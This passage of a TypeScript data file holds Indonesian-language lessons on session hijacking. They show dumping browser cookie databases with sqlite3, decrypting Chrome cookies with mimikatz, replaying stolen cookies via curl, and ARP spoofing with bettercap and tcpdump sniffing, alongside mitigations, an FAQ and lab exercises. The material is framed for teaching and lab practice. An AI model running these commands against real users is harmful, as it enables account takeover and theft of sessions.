          { masalah: "Cookie tidak ada di document.cookie", solusi: "Cookie HttpOnly=True tidak visible dari JS. Lab DVWA default HttpOnly=False." },
          { masalah: "HTTPS site tidak kena MITM", solusi: "HTTPS + HttpOnly masih kena via XSS stored. Defense berlapis tetap penting." },
        ],
      },
      {
        nama: "Metode 2: Session Hijacking via Cookie Storage Analysis",
        level: "menengah",
        deskripsi: "Untuk environment tanpa XSS, attacker gunakan device compromised atau forensic dump SQLite browser cookie database.",
        prasyarat: ["Akses ke device victim ATAU forensic dump SQLite browser cookie database"],
        langkah: [
          { judul: "Lokasi cookie store di browser", aksi: "Browser modern simpan cookies di SQLite:\n- Chrome: ~/.config/google-chrome/Default/Cookies (Linux)\n- Firefox: ~/.mozilla/firefox/xxxx.default-release/cookies.sqlite (Linux)\n- Safari: ~/Library/Cookies/Cookies.binarycookies (Mac)", expected: "Path cookie store ditunjukkan." },
          { judul: "Dump cookies SQLite (Firefox tanpa encryption)", aksi: "Untuk Firefox tanpa encryption (older version):\nsqlite3 ~/.mozilla/firefox/xxx.default-release/cookies.sqlite 'SELECT name,value FROM moz_cookies'\n\nUntuk Chrome (encrypted dengan DPAPI): butuh akses master key via mimikatz atau gunakan ChromiumCookiesView.", command: "sqlite3 ~/.mozilla/firefox/*.default-release/cookies.sqlite 'SELECT name,value,host FROM moz_cookies'", expected: "Daftar cookies in plain text (Firefox). Chrome shows encrypted." },
          { judul: "Restore cookies di browser attacker", aksi: "Pakai EditThisCookie extension di Chrome untuk restore. Atau pakai curl untuk verify:\ncurl -X GET https://github.com -b user_session=COOKIE_VALUE", command: "curl -b user_session=COOKIE_VALUE https://github.com", expected: "Response 200 dengan konten authenticated (username terlihat)." },
        ],
        outputAkhir: "Berhasil ambil cookie dari browser cookie storage dan impersonate user.",
        kesalahanUmum: [
          { masalah: "Chrome cookies encrypted (AES)", solusi: "Chrome cookies encrypted DPAPI (Windows) atau libsecret (Linux). Decryption butuh akses master key dari user logged-in. Tools: ChromiumCookiesView, mimikatz dpapi." },
          { masalah: "Cookie expire saat coba", solusi: "Cookies punya expiry. Restore secepat mungkin setelah obtaining." },
        ],
      },
      {
        nama: "Metode 3: MITM Session Sniff (Lanjut)",
        level: "lanjut",
        deskripsi: "Di network tidak terenkripsi (HTTP, WiFi publik), attacker sniff traffic dan dapat cookie dari request.",
        prasyarat: ["Akses same network dengan victim (WiFi publik, ARP spoofing lab)", "Wireshark atau tcpdump"],
        langkah: [
          { judul: "Setup ARP spoofing lab", aksi: "Untuk lab, jalankan ARP spoofing dengan Ettercap atau Bettercap:\nbettercap -eval 'set http.proxy.port 8080; arp.spoof on; http.proxy on'", expected: "Victim melihat kamu sebagai gateway." },
          { judul: "Sniff HTTP request berisi cookie", aksi: "Jalankan Wireshark di attacker PC. Capture traffic pada interface. Filter: http.cookie contains session atau http.request.full_uri contains login.\n\nSaat victim login ke target via HTTP, request POST login lewat kamu. Set-Cookie di response -> cookie ada.", command: "tcpdump -i eth0 -A | grep -i cookie", expected: "Cookie Set-Cookie terlihat di output." },
          { judul: "Impersonate via captured session ID", aksi: "Salin session ID. Pakai curl atau browser victim:\ncurl -b PHPSESSID=sniffed_value https://target/sensitive-page", command: "curl -b PHPSESSID=sniffed_value https://target/", expected: "Response 200 dengan konten authenticated." },
          { judul: "Defense: HTTPS selalu", aksi: "MITOR defense. Setiap website modern harus HTTPS-only. Cek pakai Mozilla Observatory atau SSL Labs. HSTS header ensures selalu HTTPS.", command: "curl -I https://github.com -L", expected: "Header Strict-Transport-Security muncul." },
        ],
        outputAkhir: "Berhasil sniff session cookie HTTP dan impersonate user. Pemahaman mengapa HTTPS wajib.",
        kesalahanUmum: [
          { masalah: "Semua traffic HTTPS, tidak ada yang bisa di-sniff", solusi: "Bagus — artinya target sudah aman. Untuk lab, gunakan HTTP-only target seperti DVWA via Docker di localhost." },
        ],
      },
    ],
    mitigasi: "Pertahanan session hijacking: HttpOnly Cookie (WAJIB, tidak bisa dibaca via JS), Secure Cookie (hanya via HTTPS), SameSite=Strict/Lax (tidak kirim cross-site), Regenerate Session ID After Login (anti fixation), Session Timeout (15-30 menit idle), Strong Random Session ID (256-bit random), JWT + Refresh Token Rotation (modern, scalable).",
    latihan: ["Di DVWA, setup XSS Reflected + HttpOnly via PHP cookie_set HttpOnly flag. Test cookie stealer - akan gagal.", "Setup bettercap di lab, snif HTTP traffic ke DVWA dari target lain. Capture session ID.", "Pelajari JWT structure. Decode token JWT di jwt.io dan lihat claim apa saja.", "Build CTF challenge dengan multi-step: login -> XSS -> cookie exfil -> impersonate."],
    faq: [
      { q: "Apa beda session ID dan JWT?", a: "Session ID adalah random string dipetakan ke server-side storage. JWT adalah self-contained token dengan payload + signature. JWT scalable untuk distributed system." },
      { q: "Apakah HttpOnly block semua session hijacking?", a: "Block via XSS. Tidak block MITM (kalau HTTP) atau local malware. Tetap perlu HTTPS + secure cookie." },
      { q: "Session TTL berapa yang recommended?", a: "15-30 menit idle untuk aplikasi sensitive. Refresh token: 30-90 hari, rotation setiap pakai." },
    ],
    ringkasan: ["Session ID = temporary identifier setelah login", "Hijacking: steal cookie via XSS, MITM, malware", "HttpOnly = primary defense vs XSS stealing", "Secure + SameSite = defense vs MITM + CSRF", "Regenerate ID after login = anti fixation"],
    materiRelated: ["XSS", "CSRF", "MITM", "Secure Coding"],
  } as MateriData,
];

export default seranganSystem;
